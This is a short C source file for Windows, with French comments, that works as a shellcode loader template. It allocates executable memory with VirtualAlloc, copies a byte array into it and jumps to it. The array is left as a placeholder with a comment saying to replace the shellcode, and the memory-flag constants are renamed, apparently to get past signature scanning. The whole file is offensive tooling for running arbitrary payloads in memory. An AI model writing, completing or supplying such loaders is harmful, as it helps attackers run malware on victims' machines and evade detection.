#include <windows.h>
#include <stdio.h>

#define EXECUTEREADWRITE_FLAG 0x40
#define COMMIT_RESERVE_FLAG 0x3000

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // remplacer le shellcode
    unsigned char shellcode[] = {
        0x00};

    LPVOID payloadAddress = VirtualAlloc(NULL, sizeof(shellcode), COMMIT_RESERVE_FLAG, EXECUTEREADWRITE_FLAG);
    if (!payloadAddress)
    {
        printf("Échec de l'allocation mémoire\n");
        return (1);
    }
    memcpy(payloadAddress, shellcode, sizeof(shellcode));
    void (*payloadFunction)() = (void (*)())payloadAddress;
    payloadFunction();
    return 0;
}
